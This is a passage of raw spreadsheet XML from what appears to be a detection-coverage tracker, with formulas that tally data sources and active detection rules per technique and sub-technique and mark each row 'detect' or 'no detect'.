        <f t="array" ref="I28">IF(SUM(IF($C28=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C28=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J28" s="9" cm="1">
        <f t="array" ref="J2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1</v>
      </c>
      <c r="K28" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M28" s="9" cm="1">
        <f t="array" ref="M28">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N28" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O28" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P28" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S2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8" t="s">
        <v>425</v>
      </c>
      <c r="U28" t="s">
        <v>476</v>
      </c>
      <c r="V28" t="s">
        <v>477</v>
      </c>
      <c r="W28" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="29" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A29" t="s">
        <v>474</v>
      </c>
      <c r="B29" t="s">
        <v>478</v>
      </c>
      <c r="C29" t="s">
        <v>479</v>
      </c>
      <c r="D29" t="s">
        <v>12</v>
      </c>
      <c r="E29" t="s">
        <v>438</v>
      </c>
      <c r="F29" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G29" s="9" cm="1">
        <f t="array" ref="G29">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H29" s="9" t="str" cm="1">
        <f t="array" ref="H29">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I29" s="9" cm="1">
        <f t="array" ref="I29">IF(SUM(IF($C29=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C29=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J29" s="9" t="str" cm="1">
        <f t="array" ref="J2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9" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M29" s="9" cm="1">
        <f t="array" ref="M29">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N29" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O29" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P29" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S2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9" t="s">
        <v>480</v>
      </c>
      <c r="U29" t="s">
        <v>481</v>
      </c>
      <c r="V29" t="s">
        <v>482</v>
      </c>
      <c r="W29" t="b">
        <v>1</v>
      </c>
      <c r="X29" t="s">
        <v>474</v>
      </c>
    </row>
    <row r="30" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A30" t="s">
        <v>483</v>
      </c>
      <c r="B30" t="s">
        <v>483</v>
      </c>
      <c r="C30" t="s">
        <v>71</v>
      </c>
      <c r="D30" t="s">
        <v>9</v>
      </c>
      <c r="E30" t="s">
        <v>484</v>
      </c>
      <c r="F30" s="9">
        <f t="shared" si="0"/>
        <v>8</v>
      </c>
      <c r="G30" s="9" cm="1">
        <f t="array" ref="G30">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H30" s="9" cm="1">
        <f t="array" ref="H30">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>8</v>
      </c>
      <c r="I30" s="9" t="str" cm="1">
        <f t="array" ref="I30">IF(SUM(IF($C30=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C30=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J30" s="9" cm="1">
        <f t="array" ref="J3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30" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>8</v>
      </c>
      <c r="M30" s="9" cm="1">
        <f t="array" ref="M30">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>8</v>
      </c>
      <c r="N30" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O30" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P30" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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0" t="s">
        <v>485</v>
      </c>
      <c r="U30" t="s">
        <v>486</v>
      </c>
      <c r="V30" t="s">
        <v>487</v>
      </c>
      <c r="W30" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="31" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A31" t="s">
        <v>483</v>
      </c>
      <c r="B31" t="s">
        <v>488</v>
      </c>
      <c r="C31" t="s">
        <v>489</v>
      </c>
      <c r="D31" t="s">
        <v>9</v>
      </c>
      <c r="E31" t="s">
        <v>490</v>
      </c>
      <c r="F31" s="9">
        <f t="shared" si="0"/>
        <v>5</v>
      </c>
      <c r="G31" s="9" cm="1">
        <f t="array" ref="G31">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H31" s="9" t="str" cm="1">
        <f t="array" ref="H31">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I31" s="9" t="str" cm="1">
        <f t="array" ref="I31">IF(SUM(IF($C31=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C31=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J31" s="9" t="str" cm="1">
        <f t="array" ref="J3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1" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M31" s="9" cm="1">
        <f t="array" ref="M31">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N31" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O31" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P31" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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1" t="s">
        <v>386</v>
      </c>
      <c r="U31" t="s">
        <v>491</v>
      </c>
      <c r="V31" t="s">
        <v>492</v>
      </c>
      <c r="W31" t="b">
        <v>1</v>
      </c>
      <c r="X31" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="32" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A32" t="s">
        <v>483</v>
      </c>
      <c r="B32" t="s">
        <v>493</v>
      </c>
      <c r="C32" t="s">
        <v>239</v>
      </c>
      <c r="D32" t="s">
        <v>9</v>
      </c>
      <c r="E32" t="s">
        <v>494</v>
      </c>
      <c r="F32" s="9">
        <f t="shared" si="0"/>
        <v>6</v>
      </c>
      <c r="G32" s="9" cm="1">
        <f t="array" ref="G32">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H32" s="9" t="str" cm="1">
        <f t="array" ref="H32">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I32" s="9" t="str" cm="1">
        <f t="array" ref="I32">IF(SUM(IF($C32=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C32=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J32" s="9" t="str" cm="1">
        <f t="array" ref="J3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2" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M32" s="9" cm="1">
        <f t="array" ref="M32">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N32" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O32" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P32" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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2" t="s">
        <v>386</v>
      </c>
      <c r="U32" t="s">
        <v>495</v>
      </c>
      <c r="V32" t="s">
        <v>496</v>
      </c>
      <c r="W32" t="b">
        <v>1</v>
      </c>
      <c r="X32" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="33" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A33" t="s">
        <v>483</v>
      </c>
      <c r="B33" t="s">
        <v>497</v>
      </c>
      <c r="C33" t="s">
        <v>305</v>
      </c>
      <c r="D33" t="s">
        <v>9</v>
      </c>
      <c r="E33" t="s">
        <v>498</v>
      </c>
      <c r="F33" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G33" s="9" cm="1">
        <f t="array" ref="G33">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H33" s="9" t="str" cm="1">
        <f t="array" ref="H33">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I33" s="9" t="str" cm="1">
        <f t="array" ref="I33">IF(SUM(IF($C33=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C33=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J33" s="9" t="str" cm="1">
        <f t="array" ref="J3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3" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M33" s="9" cm="1">
        <f t="array" ref="M33">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N33" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O33" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P33" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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3" t="s">
        <v>386</v>
      </c>
      <c r="U33" t="s">
        <v>499</v>
      </c>
      <c r="V33" t="s">
        <v>500</v>
      </c>
      <c r="W33" t="b">
        <v>1</v>
      </c>
      <c r="X33" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="34" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A34" t="s">
        <v>483</v>
      </c>
      <c r="B34" t="s">
        <v>501</v>
      </c>
      <c r="C34" t="s">
        <v>233</v>
      </c>
      <c r="D34" t="s">
        <v>9</v>
      </c>
      <c r="E34" t="s">
        <v>502</v>
      </c>
      <c r="F34" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G34" s="9" cm="1">
        <f t="array" ref="G34">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H34" s="9" t="str" cm="1">
        <f t="array" ref="H34">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I34" s="9" t="str" cm="1">
        <f t="array" ref="I34">IF(SUM(IF($C34=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C34=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J34" s="9" t="str" cm="1">
        <f t="array" ref="J3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4" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M34" s="9" cm="1">
        <f t="array" ref="M34">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N34" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O34" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P34" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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4" t="s">
        <v>503</v>
      </c>
      <c r="U34" t="s">
        <v>504</v>
      </c>
      <c r="V34" t="s">
        <v>505</v>
      </c>
      <c r="W34" t="b">
        <v>1</v>
      </c>
      <c r="X34" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="35" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A35" t="s">
        <v>483</v>
      </c>
      <c r="B35" t="s">
        <v>506</v>
      </c>
      <c r="C35" t="s">
        <v>507</v>
      </c>
      <c r="D35" t="s">
        <v>9</v>
      </c>
      <c r="E35" t="s">
        <v>502</v>
      </c>
      <c r="F35" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G35" s="9" cm="1">
        <f t="array" ref="G35">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H35" s="9" t="str" cm="1">
        <f t="array" ref="H35">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I35" s="9" t="str" cm="1">
        <f t="array" ref="I35">IF(SUM(IF($C35=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C35=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J35" s="9" t="str" cm="1">
        <f t="array" ref="J3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5" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M35" s="9" cm="1">
        <f t="array" ref="M35">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N35" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O35" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P35" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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5" t="s">
        <v>368</v>
      </c>
      <c r="U35" t="s">
        <v>508</v>
      </c>
      <c r="V35" t="s">
        <v>509</v>
      </c>
      <c r="W35" t="b">
        <v>1</v>
      </c>
      <c r="X35" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="36" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A36" t="s">
        <v>483</v>
      </c>
      <c r="B36" t="s">
        <v>510</v>
      </c>
      <c r="C36" t="s">
        <v>319</v>
      </c>
      <c r="D36" t="s">
        <v>9</v>
      </c>
      <c r="E36" t="s">
        <v>511</v>
      </c>
      <c r="F36" s="9">
        <f t="shared" si="0"/>
        <v>6</v>
      </c>
      <c r="G36" s="9" cm="1">
        <f t="array" ref="G36">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H36" s="9" t="str" cm="1">
        <f t="array" ref="H36">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I36" s="9" t="str" cm="1">
        <f t="array" ref="I36">IF(SUM(IF($C36=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C36=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J36" s="9" t="str" cm="1">
        <f t="array" ref="J3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6" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M36" s="9" cm="1">
        <f t="array" ref="M36">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N36" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O36" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P36" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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6" t="s">
        <v>386</v>
      </c>
      <c r="U36" t="s">
        <v>512</v>
      </c>
      <c r="V36" t="s">
        <v>513</v>
      </c>
      <c r="W36" t="b">
        <v>1</v>
      </c>
      <c r="X36" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="37" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A37" t="s">
        <v>483</v>
      </c>
      <c r="B37" t="s">
        <v>514</v>
      </c>
      <c r="C37" t="s">
        <v>515</v>
      </c>
      <c r="D37" t="s">
        <v>9</v>
      </c>
      <c r="E37" t="s">
        <v>516</v>
      </c>
      <c r="F37" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G37" s="9" cm="1">
        <f t="array" ref="G37">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H37" s="9" t="str" cm="1">
        <f t="array" ref="H37">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I37" s="9" t="str" cm="1">
        <f t="array" ref="I37">IF(SUM(IF($C37=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C37=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J37" s="9" t="str" cm="1">
        <f t="array" ref="J3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7" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M37" s="9" cm="1">
        <f t="array" ref="M37">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N37" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O37" s="14">
